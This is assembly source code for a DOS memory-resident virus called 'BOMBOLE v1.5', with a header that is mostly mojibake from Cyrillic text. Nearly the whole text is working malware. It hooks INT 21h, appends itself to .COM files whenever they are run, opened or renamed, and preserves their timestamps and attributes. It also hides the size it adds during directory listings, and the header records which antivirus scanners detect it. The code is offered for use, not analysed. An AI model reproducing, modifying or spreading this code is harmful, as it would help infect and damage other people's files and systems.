   ;
   ;                             <<BOMBOLE v1.5>>
   ;
   ; *¥§¨¤¥âë© áâ ¤ àâë© *.‘ŽŒ ¨ä¥ªâ®à.
   ; - ‡ ¢¨á ¥â ¢ áâ àè¨å  ¤à¥á å ¯ ¬ïâ¨ ¯à¨ ¯®¬®é¨ äãªæ¨© DOS
   ; - ‚ ª ç¥áâ¢¥ ¯à¨§ ª  § à ¦¥¨ï ¯ ¬ïâ¨ ¨á¯®«ì§ã¥â 0EFh/INT 21h, ¥á«¨ ª®¤
   ;   ¢ à¥£¨áâà¥ AL ¯à¨ ¢®§¢à â¥ = OEFh, ¯ ¬ïâì § à ¦¥ .
   ; - ‡ à ¦ ¥â ¯à¨: ‡ ¯ãáª¥        (AH=4Bh)
   ;                 Žâªàëâ¨¨       (AH=3Dh)
   ;                 *¥à¥¨¬¥®¢ ¨¨ (AH=56h)
   ; - *¥ § à ¦ ¥â ä ©«ë, ¨¬ï ª®â®àëå ?OMMAND.*
   ; - *¥ § à ¦ ¥â *.…•… (à á¯®§ ñâ ¯® ¢ãâà¥¥¬ã ä®à¬ âã)
   ; - *¥ § à ¦ ¥â ä ©«ë ¬¥ìè¥ ¢¨àãá  (410 ¡ ©â) ¨ ¡®«ìè¥ 64000 ¡ ©â
   ; - ‘®åà ï¥â  âà¨¡ãâë/¤ âã/¢à¥¬ï ä ©« 
   ; - ‡ à ¦ ¥â ä ©«ë á «î¡ë¬¨  âà¨¡ãâ ¬¨
   ; - Stealth ¯à¨ ¯®¨áª¥ ä ©«  (4eh,4fh) **ˆŒ.: ‘â¥«á¨à®¢ ¨¥ ¥ äãàëç¨â, ¥á«¨
   ;   ¯®¨áª ¨¤ñâ ¨§ ¤àã£®£® ª â «®£ , â.ª. ä ©« ¯ëâ ¥âáï ®âªàëâìáï ¢ â¥ªãé¥¬,
   ;   â.¥. ¢ ¤àã£®¬, ¢ ª®â®à®¬ ä ©« , ¥áâ¥áâ¢¥® ¥â.
   ;
   ; DrWeb - COM.TSR.Virus
   ;       Memory - INFECTED!!!
   ; NAV   - ?
   ; AVP   - ?
   ;       Memory - ?
   ;
   ; 14.04.00                                         (C) GOBLEEN WARRIORS INC.
                           .286
                           .model tiny
                           .code
   virlen                  equ virend-virstart
   virpar                  equ (virlen+15)/16
                           org 100h
   start:                  jmp virstart
   ;delta
   virstart:               call $+3
   delta:                  int 03h
                           pop bp
                           sub bp,offset delta
   ;restore origin start
                           mov di,100h
                           lea si,[bp+origin_start]
                           push di
                           movsb
                           movsw
   ;save registers
                           pusha
                           push ds
                           push es
   ;test for already inmem
                           mov ah,0efh
                           int 21h
                           cmp al,0efh
                           jne install
   ;return to host
   return:                 pop es
                           pop ds
                           popa
                           retn
   ;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   ;+ INSTALLATION ROUTINE                                                                       +
   ;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   install:                mov ah,4ah
                           mov bx,0ffffh
                           int 21h
                           sub bx,virpar+2
                           mov ah,4ah
                           int 21h
                           mov ah,48h
                           mov bx,virpar+1
                           int 21h
                           push ax
                           dec ax
                           push ax
                           pop es
                           mov byte ptr es:[0],'Z'
                           mov word ptr es:[1],8
   ;copy vir to mem
                           pop es
                           lea si,[bp+start]
                           mov di,100h
                           mov cx,virlen+3
                           rep movsb
   ; +3 çâ®¡ë ¥ § ¯¨áë¢ âì ¬ãá®à ¢áïª¨© ¢¥¤ì ¯à¨ ¨áâ «ïæ¨¨ ¢ ¯ ¬ïâì ¬ë ¯¨è¥¬
   ;   3 ¡ ©â  ¡®«ìè¥, ç¥¬  ¤®,   íâ® ã  á=VIRLEN, ¨ ¯¨è¥¬ ¬ë íâ® ¢áñ á
   ; ¬¥âª¨ START,   ¢ ä ©« ¬ë ¯¨è¥¬ á ¬¥âª¨ VIRSTART, çâ®   3 ¡ ©â <VIRLEN ¨
   ; ¢¨à ¤®¯¨áë¢ ¥â ¢ ª®æ¥ 3 ¡ ©â  ¬ãá®à . € ¡ £  ¯à¨ íâ®¬ ¥éñ â ª ï ¡ë« :
   ; ®¯ïâì ¦¥ ¨§§  ¥á®®â¢¥âáâ¢¨ï ãª § ëå ¨ ¤¥©áâ¢¨â¥«ìëå à §¬¥à®¢ ¢ ¯ ¬ïâì
   ; ¥ ª®¯¨à®¢ «áï ¯®á«¥¤¨© ¡ ©â ¢¨à  - 0e9h, ¨   ¬¥áâ¥ ¥£® ®ª §ë¢ «áï 0.

   ;hook interupts
                           push es
                           pop ds
                           mov ax,3521h
                           int 21h
                           mov word ptr ds:[old_int21],bx
                           mov word ptr ds:[old_int21+2],es
                           mov ax,2521h
                           lea dx,ds:[new_int21]
                           int 21h
   ;return to host
                           jmp short return

   ;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   ;+ INT 21h HANDLER                                                         +               +
   ;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   new_int21:              cmp ah,0efh
                           je testing
                           cmp ah,04bh
                           je infect
                           cmp ah,03dh
                           je infect
                           cmp ah,056h
                           je infect

                           cmp ah,4eh   ;
                           je find_f    ; STEALTH
                           cmp ah,4fh   ;
                           je find_f    ;

   ;return to old handler
   not_infect:             db 0eah
   old_int21               dd 0
   ;test for residency
   testing:                xchg ah,al
                           iret

   ;STEALTH
   find_f:                 pushf
                           call dword ptr cs:[old_int21]
                           jc s_exit
                           pushf
                           pusha
                           push ds
                           push es
                           mov ah,2fh           ;adress of current DTA in ES:BX
                           int 21h
                           mov bp,bx            ;BP=BX
                           push es              ;ES=DS
                           pop ds
                           mov ax,3d00h         ;open file
                           xor cx,cx            ;all atributes
                           lea dx,[bp+1eh]      ;name in DTA DS:BX
                           pushf                ;push flags
                           call dword ptr cs:[old_int21] ;call old INT 21h
                           jc s_restore         ;errors? - exit
                           xchg ax,bx           ;file descriptor in BX
                           mov ax,4200h         ;mov pointer from start
                           xor cx,cx            ;into filesize-14 bytes
                           mov dx,word ptr es:[bp+1ah]
                           sub dx,14
                           int 21h
                           jc s_closef          ;errors? close file
                           push cs              ;DS=CS
                           pop ds
                           mov ah,3fh           ;read
                           mov cx,2             ;2 bytes
                           lea dx,[buffa]       ;to CS:[buffa]
                           int 21h
                           jc s_closef
                           cmp word ptr [buffa],'IR' ;cmp buffa & 'RI'
                           jne s_closef         ;not equial? Close f
                           sub word ptr es:[bp+1ah],virlen
   s_closef:               mov ah,3eh
                           int 21h
   s_restore:              pop es
                           pop ds
                           popa
                           popf
   s_exit:                 retf 2             ;return & getout frm stack 2 bytes
   ;save registers
   infect:                 pushf
                           pusha
                           push ds
   ;test the name
                           mov si,dx
                           mov word ptr cs:[f_name],dx ;save name offset
   searching:              cmp byte ptr ds:[si],0
                           je found_zero
                           inc si
                           jmp short searching
   found_zero:             cmp word ptr ds:[si-2],'MO'        ;*.COM (¤«ï 3Dh)
                           jne bad_f
                           cmp word ptr ds:[si-4],'C.'
                           jne bad_f
   ; **ˆŒ: ¥«ì§ï ã¡¨à âì ¯à®¢¥àªã   *.COM, â.ª. ¢¨àì ¡ã¤¥â ¯®£ ¨âì ¢á¥
   ; ®âªàë¢ ¥¬ë¥ ä ©«ë.
                           cmp word ptr ds:[si-6],'DN'
                           jne save_attr
                           cmp word ptr ds:[si-8],'AM'     ;?OMMAND.*
                           jne save_attr
                           cmp word ptr ds:[si-10],'MO'
                           jne save_attr
   bad_f:                  jmp restore_all
   ;save file atributes & set 'em to archive
   save_attr:              mov ax,4300h
                           int 21h
                           mov word ptr cs:[f_attr],cx
                           mov ax,4301h
                           xor cx,cx
                           int 21h
                           jc bad_f ; = restore_all
   ;open file for R/W
                           mov ax,3d02h
                           pushf
                           call dword ptr cs:[old_int21]
                           jc bad_f ; = restore_all
                           xchg ax,bx
                           push cs
                           pop ds
   ;read 1st 3 bites to origin_start
                           mov ah,3fh
                           lea dx,ds:[origin_start]
                           mov cx,3
                           int 21h
                           jc close_f
   ;goto EOF
                           mov ax,4202h
                           xor cx,cx
                           cwd
                           int 21h
                           jc close_f
   ;test the file to loyality
                           cmp ax,64000
                           ja close_f
                           cmp ax,virlen
                           jb close_f
                           sub ax,3
                           mov word ptr cs:[jmp_offs],ax
                           sub ax,virlen
                           cmp word ptr cs:[origin_start+1],ax
                           je close_f
                           cmp word ptr cs:[origin_start],'ZM'
                           je close_f
   ;save file time/date
                           mov ax,5700h
                           int 21h
                           mov word ptr cs:[f_time],cx
                           mov word ptr cs:[f_date],dx
   ;write our body to EOF
                           mov ah,40h
                           mov cx,virlen
                           lea dx,ds:[virstart]
                           int 21h
                           jc rest_td
   ;goto BOF
                           mov ax,4200h
                           xor cx,cx
                           cwd
                           int 21h
                           jc rest_td
   ;write new start
                           mov ah,40h
                           mov cx,3
                           lea dx,ds:[new_start]
                           int 21h
   ;restore file time/date
   rest_td:                mov ax,5701h
                           db 0b9h
   f_time                  dw ?
                           db 0bah
   f_date                  dw ?
                           int 21h
   ;close_file
   close_f:                mov ah,3eh
                           int 21h
   ;restore file atributes
                           pop ds
                           push ds
                           mov ax,4301h
                           db 0b9h
   f_attr                  dw ?
                           db 0bah
   f_name                  dw ?
                           int 21h
   ;restore registers
   restore_all:            pop ds
                           popa
                           popf
                           jmp not_infect

   ;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   ;+ VIRII DATABANK                                                         +
   ;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
   our_name                db '[BOMBOLE v1.5] by GOBLEEN WARRIORS INC.'
   origin_start            db 0cdh,20h,90h
   new_start               db 0e9h
   virend:
   jmp_offs                dw ?
   buffa                   dw ?
   end start
